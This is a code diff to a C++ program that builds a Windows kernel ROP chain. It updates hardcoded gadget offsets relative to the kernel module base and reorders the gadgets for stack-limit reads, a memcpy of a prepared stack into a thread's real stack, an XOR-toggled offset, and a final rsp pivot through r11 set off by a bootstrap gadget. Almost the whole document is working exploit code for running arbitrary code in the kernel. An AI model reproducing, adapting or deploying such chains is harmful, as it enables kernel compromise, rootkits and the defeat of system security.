@@ -84,88 +84,89 @@ int main()
     // Grab stack limit
 
     KernelStackManager.AddFunctionCall("PsGetCurrentThread");
-    KernelStackManager.AddGadget(0x256c4a, "pop rcx; ret;");
+    KernelStackManager.AddGadget(0x24cd7b, "pop rcx; ret;");
     KernelStackManager.AddValue(0x30, "stack limit");
-    KernelStackManager.AddGadget(0x28efa4, "add rax, rcx; ret;");
+    KernelStackManager.AddGadget(0x263f08, "add rax, rcx; ret;");
 
     // rdx = stack limit store address
-    KernelStackManager.AddGadget(0x3cca89, "pop rdx; ret;");
+    KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
     KernelStackManager.AddValue((std::uint64_t)StackLimitStoreAddress, "stack limit store address");
 
     // dereference rax, so that rax = stack limit
-    KernelStackManager.AddGadget(0x25d375, "mov rax, qword ptr [rax]; ret;");
-    KernelStackManager.AddGadget(0x202e49, "mov qword ptr [rdx], rax; ret;");
+    KernelStackManager.AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
+    KernelStackManager.AddGadget(0x432d4d, "mov qword ptr [rdx], rax; ret;");
 
 
     // move rax into rbx to preserve it
-    KernelStackManager.AddGadget(0x267743, "push rax; pop rbx; ret;");
+    KernelStackManager.AddGadget(0x29cc0e, "push rax; pop rbx; ret;");
     // sets rax to either 'rax + 0x2000' or 'rax + 0x4000' depending on i % 2.
-    // read the value of the current stack offset global variable
-    KernelStackManager.AddGadget(0x210e10, "pop rax; ret;");
-    KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
-    KernelStackManager.AddGadget(0x25d375, "mov rax, qword ptr [rax]; ret;");
-    // move rax into rcx so we store the offset in rcx
-    KernelStackManager.AddGadget(0x54810e, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
+    // store rax in r10
+    KernelStackManager.AddGadget(0x5453fe, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
     KernelStackManager.AddPadding(0x28);
-    KernelStackManager.AddGadget(0x36d2de, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
+    // read the value of the current stack offset global variable
+    KernelStackManager.AddGadget(0x202547, "pop rax; ret;");
+    KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
+    KernelStackManager.AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
+    // move rax into rcx so we store the offset in rcx
+    KernelStackManager.AddGadget(0x5453fe, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
+    KernelStackManager.AddPadding(0x28);
+    KernelStackManager.AddGadget(0x302e3e, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
     // restore the old value of rax into rax from rbx
-    KernelStackManager.AddGadget(0x571bf2, "push rbx; pop rax; add rsp, 0x20; pop rbx; ret;");
+    KernelStackManager.AddGadget(0x56f5f2, "push rbx; pop rax; add rsp, 0x20; pop rbx; ret;");
     KernelStackManager.AddPadding(0x20 + 0x8);
-    KernelStackManager.AddGadget(0x28efa4, "add rax, rcx; ret;");
+    KernelStackManager.AddGadget(0x263f08, "add rax, rcx; ret;");
 
 
     // Write our own stack into thread's legitimate stack
-    KernelStackManager.AddGadget(0x54810e, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
+    KernelStackManager.AddGadget(0x5453fe, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
     KernelStackManager.AddPadding(0x28);
-    KernelStackManager.AddGadget(0x36d2de, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
-    KernelStackManager.AddGadget(0x3cca89, "pop rdx; ret;");
+    KernelStackManager.AddGadget(0x302e3e, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
+    KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
     KernelStackManager.AddValue((std::uint64_t)OriginalStackAllocation, "src address");
-    KernelStackManager.AddGadget(0x2f7921, "pop r8; ret;");
+    KernelStackManager.AddGadget(0x47f82d, "pop r8; ret;");
     KernelStackManager.AddValue(0x2000, "count value");
     KernelStackManager.AddFunctionCall("memcpy");
 
     // Grab stack limit
     KernelStackManager.AddFunctionCall("PsGetCurrentThread");
-    KernelStackManager.AddGadget(0x256c4a, "pop rcx; ret;");
+    KernelStackManager.AddGadget(0x24cd7b, "pop rcx; ret;");
     KernelStackManager.AddValue(0x30, "stack limit");
-    KernelStackManager.AddGadget(0x28efa4, "add rax, rcx; ret;");
+    KernelStackManager.AddGadget(0x263f08, "add rax, rcx; ret;");
     // dereference rax, so that rax = stack limit
-    KernelStackManager.AddGadget(0x25d375, "mov rax, qword ptr [rax]; ret;");
+    KernelStackManager.AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
 
     // get the value of the current stack offset global so we add it into rax
 
     // same code as above - basically just get the value of CurrentStackOffsetAddress
     // and add it to rax. so rax = stacklimit + curr_stack_offset
-    KernelStackManager.AddGadget(0x267743, "push rax; pop rbx; ret;");
-    KernelStackManager.AddGadget(0x210e10, "pop rax; ret;");
+    KernelStackManager.AddGadget(0x29cc0e, "push rax; pop rbx; ret;");
+    KernelStackManager.AddGadget(0x202547, "pop rax; ret;");
     KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
-    KernelStackManager.AddGadget(0x25d375, "mov rax, qword ptr [rax]; ret;");
-    KernelStackManager.AddGadget(0x54810e, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
+    KernelStackManager.AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
+    KernelStackManager.AddGadget(0x5453fe, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
     KernelStackManager.AddPadding(0x28);
-    KernelStackManager.AddGadget(0x36d2de, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
-    KernelStackManager.AddGadget(0x571bf2, "push rbx; pop rax; add rsp, 0x20; pop rbx; ret;");
+    KernelStackManager.AddGadget(0x302e3e, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
+    KernelStackManager.AddGadget(0x56f5f2, "push rbx; pop rax; add rsp, 0x20; pop rbx; ret;");
     KernelStackManager.AddPadding(0x20 + 0x8);
-    KernelStackManager.AddGadget(0x28efa4, "add rax, rcx; ret;");
+    KernelStackManager.AddGadget(0x263f08, "add rax, rcx; ret;");
 
+    // rcx=rax, stored here so we can overwrite rax for xor operation
+    KernelStackManager.AddGadget(0x5453fe, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
+    KernelStackManager.AddPadding(0x28);
+    KernelStackManager.AddGadget(0x302e3e, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
+    // r11=rcx
+    KernelStackManager.AddGadget(0xb4096a, "mov r11, rcx; cmp edx, dword ptr [rax]; je 0xb42978; mov eax, 0xc000000d; ret;");
 
     // xor the current stack offset by global by 0x6000 (0x2000 ^ 0x4000 = 0x6000),
     // meaning we will always swap between 0x2000 and 0x4000 per iteration.
-
-    KernelStackManager.AddGadget(0x2f7921, "pop r8; ret;");
+    KernelStackManager.AddGadget(0x202547, "pop rax; ret;");
     KernelStackManager.AddValue(0x6000, "xor key (0x6000)");
-    KernelStackManager.AddGadget(0x200f35, "pop r14; ret;");
+    KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
     KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr (to xor)");
-    KernelStackManager.AddGadget(0x9b060b, "xor qword ptr [r14], r8; add dh, dh; ret;");
+    KernelStackManager.AddGadget(0x43d5e8, "xor qword ptr [rdx], rax; ret;");
 
-
-    // rcx=rax
-    KernelStackManager.AddGadget(0x54810e, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
-    KernelStackManager.AddPadding(0x28);
-    KernelStackManager.AddGadget(0x36d2de, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
-    // r11=rcx
-    KernelStackManager.AddGadget(0xb4296a, "mov r11, rcx; cmp edx, dword ptr [rax]; je 0xb42978; mov eax, 0xc000000d; ret;");
-    // pivot, rsp=r11
-    KernelStackManager.AddGadget(0x536d2a, "mov rsp, r11; ret;");
+    // perform pivot, rsp=r11
+    KernelStackManager.AddGadget(0x533eda, "mov rsp, r11; ret;");
 
 
     LARGE_INTEGER SleepInterval;
@@ -183,7 +184,7 @@ int main()
     Sleep(500);
     std::cin.get();
 
-    void* BootstrapGadget = (void*)(Driver::GetKernelModuleBase() + 0x9b8ac1); // push rcx; pop rsp; test edx, edx; je 0x9b8acd; add rsp, 0x28; ret;
+    void* BootstrapGadget = (void*)(Driver::GetKernelModuleBase() + 0x9bdb51); // push rcx; pop rsp; test edx, edx; je 0x9b8acd; add rsp, 0x28; ret;
     void* OffsetedStackAllocation = (void*)((std::uintptr_t)StackAllocation + 0x2000 - 0x28); // account for 0x28 being added in gadget
 
     HANDLE KernelThreadHandle;
